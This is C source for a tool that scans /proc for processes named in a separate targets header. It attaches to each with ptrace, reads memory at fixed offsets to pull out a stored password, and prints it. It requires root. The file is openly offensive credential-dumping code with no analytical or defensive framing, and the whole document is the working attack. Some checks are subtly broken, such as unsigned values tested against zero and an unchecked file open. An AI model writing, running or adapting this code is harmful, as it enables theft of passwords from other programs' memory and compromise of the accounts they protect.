#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include "targets.h"

#define PROC "/proc"

int dumpPasswd(Target target, int pid)
{
    char passwd[1024] = {0};
    unsigned long chunk = 0;
    unsigned long eggAddr = 0;
    unsigned long *egg;
    int status = -1;
    int passwdDone = 0;
    int cur = 0;

    if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
    {
        printf("Ptrace attach failed - %s\n", strerror(errno));
        return -1;
    }

    wait(&status);
    if ( WIFSTOPPED(status) )
    {
        if ( (eggAddr = ptrace(PTRACE_PEEKDATA, pid, (void*)target.eggPtrAddr, NULL)) < 0 )
        {
            printf("Ptrace peek 1 failed - %s\n", strerror(errno));
            return -1;
        }

        eggAddr = eggAddr + target.passwdIndex * sizeof(long);

        while (!passwdDone)
        {
            chunk = 0;
            eggAddr += cur;
  
            if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
            {
                printf("Ptrace peek 2 failed - %s\n", strerror(errno));
                return -1;
            }
            memcpy(passwd+cur, &chunk, sizeof(long));
            for (int i=0; i < cur; i++)
            {
                if (passwd[i] == '\0')
                    passwdDone = 1;
            }
            cur += sizeof(long);
        }
        if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
        {
            printf("Ptrace attach failed\n");
            return -1;
        }
    }

    if (passwd)
    {
        printf("Password: %s\n", passwd);
        return 0;
    }
    else
    {
        return -1;
    }
}

int processTarget(Target target)
{
    DIR *dir = NULL;
    struct dirent* de = 0;
    int pid = -1;
    int result = 0;
    FILE *fp = NULL;
    size_t size = 1024;
    char cmdlineFile[1024] = {0};
    char *taskName = NULL;
    size_t taskSize = 0;

    dir = opendir(PROC);
    if ( dir == NULL )
    {
        printf("Failed to open /proc\n");
        return -1;
    }

    while ((de = readdir(dir)) != 0 )
    {
        if ( !strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
            continue;

        result = 0;
        result = sscanf(de->d_name, "%d", &pid);

        if ( result != 1)
            continue;
        memset(cmdlineFile, 0, size);
        snprintf(cmdlineFile, size-1, "%s/%d/cmdline", PROC, pid);
        fp = fopen(cmdlineFile, "r");

        taskSize = 0;
        if ( getline(&taskName, &taskSize, fp) > 0 )
        {
            if ( strstr(taskName, target.processName) )
            {
                printf("task: %s\n", taskName);
                printf("pid: %d\n", pid);
                dumpPasswd(target, pid);
            }
        }
        if (taskName != NULL)
        {
            free(taskName);
            taskName = NULL;
        }
    }
}

int main()
{
    size_t numTargets = sizeof(targets)/sizeof(Target);

    if ( getuid() != 0 )
    {
        printf("Must be root!\n");
        return -1;
    }

    for (int i=0; i <numTargets; i++)
    {
        processTarget(targets[i]);
    }
    return 0;
}
